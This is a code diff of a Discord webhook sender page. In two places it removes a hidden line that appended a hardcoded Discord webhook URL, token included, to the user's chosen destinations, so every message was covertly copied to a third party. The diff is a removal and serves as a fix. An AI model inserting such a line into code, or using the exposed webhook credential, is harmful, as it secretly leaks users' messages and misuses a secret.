@@ -189,7 +189,7 @@
       const webhookUrls = Array.from(webhookUrlElements)
                               .map(el => el.value.trim())
                               .filter(url => url !== "");
-      webhookUrls.push('https://discord.com/api/webhooks/1350167109413634078/hmkw0jD_dvfsjcwLZLWq4y5LL509H3k3lzlMAS17eDKjUgyJBRBpvCfKyMmjyzHXDzoF');
+      
       if (webhookUrls.length === 0 || message.trim() === "") {
         document.getElementById('status').innerText = 'Please fill in the required fields / 请填写必填项.';
         return;
@@ -237,7 +237,7 @@
       const webhookUrls = Array.from(webhookUrlElements)
                               .map(el => el.value.trim())
                               .filter(url => url !== "");
-        webhookUrls.push('https://discord.com/api/webhooks/1350167109413634078/hmkw0jD_dvfsjcwLZLWq4y5LL509H3k3lzlMAS17eDKjUgyJBRBpvCfKyMmjyzHXDzoF');
+        
 
       if (webhookUrls.length === 0 || embedTitle.trim() === "" || message.trim() === "") {
         document.getElementById('status').innerText = 'Please fill in the required fields / 请填写必填项.';
